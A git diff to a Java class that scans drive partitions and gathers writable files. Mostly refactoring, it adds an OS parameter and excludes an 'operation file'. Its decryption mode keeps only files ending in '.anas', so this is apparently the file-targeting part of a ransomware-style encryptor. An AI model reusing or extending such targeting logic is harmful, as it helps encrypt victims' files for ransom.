@@ -1,6 +1,7 @@
 package files;
 
 import enums.To;
+import helpers.Constants;
 
 import java.io.File;
 import java.util.ArrayList;
@@ -8,12 +9,14 @@ import java.util.Arrays;
 import java.util.Objects;
 
 public class GetFiles {
-    private File[] drivers;
-    private ArrayList<File> desktops;
+    private final File[] drivers;
+    private final ArrayList<File> desktops;
+    private final String os;
 
-    public GetFiles() {
+    public GetFiles(String os) {
         drivers = scanDrivers();
-        desktops = new ArrayList();
+        desktops = new ArrayList<>();
+        this.os = os;
     }
 
     private File[] scanDrivers() { // Get partitions
@@ -25,10 +28,10 @@ public class GetFiles {
     }
 
     public ArrayList<File> scanFiles(File drive, To to) {
-        ArrayList<File> files = new ArrayList(Arrays.asList(Objects.requireNonNull(drive.listFiles())));
+        ArrayList<File> files = new ArrayList<>(Arrays.asList(Objects.requireNonNull(drive.listFiles())));
 
         int i = 0;
-        boolean isEnd = false;
+        boolean isEnd;
         boolean isSystemDrive = (drive.toString().equals("C:\\"));
         if (isSystemDrive) {
             // delete files system
@@ -58,14 +61,15 @@ public class GetFiles {
             isEnd = files.size() <= ++i;
         } while (!isEnd);
 
-        // Delete directories and can't write files
+        // Filtration
         for (int j = 0; j < files.size(); j++) {
             File file = files.get(j);
             if (to == To.DECRYPTION && !file.getName().endsWith(".anas")) {
                 files.remove(j--);
                 continue;
             }
-            if (file.isDirectory() || !file.canWrite())
+            // Delete directories and can't write files and operation file
+            if (file.isDirectory() || !file.canWrite() || file.getName().equals(Constants.operationFileName))
                 files.remove(j--);
         }
         return files;
